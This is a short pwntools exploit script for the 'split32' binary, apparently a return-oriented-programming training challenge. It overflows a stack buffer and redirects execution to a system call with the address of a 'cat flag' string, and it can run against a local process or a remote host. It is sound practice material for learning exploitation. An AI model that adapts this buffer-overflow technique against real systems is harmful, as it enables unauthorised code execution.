#!/usr/bin/env python
from pwn import *
import sys

context.terminal = ['tmux','splitw','-h']

#gdb_bool = True
gdb_bool = False

def exploit(r):

    cat_flag = 0x804a030
    r.recvuntil("> ")
    buf = ""
    buf += "A" * cyclic_find("laaa")
    buf += p32(0x8048657)
    buf += p32(cat_flag)
    r.sendline(buf)
    r.interactive()
    return





if __name__ == "__main__":
    log.info("For remote %s HOST PORT" % sys.argv[0])
    
    e = ELF("split32")

    if len(sys.argv) > 1:
        r = remote(sys.argv[1], int(sys.argv[2]))
        exploit(r)
    else:
        r = process('./split32')     #put binary here
        print util.proc.pidof(r)
        gdb_cmd = [
            "b *0x8048648",
            "c"


        ]
        if(gdb_bool):
            gdb.attach(r, gdbscript = "\n".join(gdb_cmd))
        ##r = process("./LOLgame", env={"LD_PRELOAD" : "./libc.so.6.remote"})
        #pause()
        exploit(r)










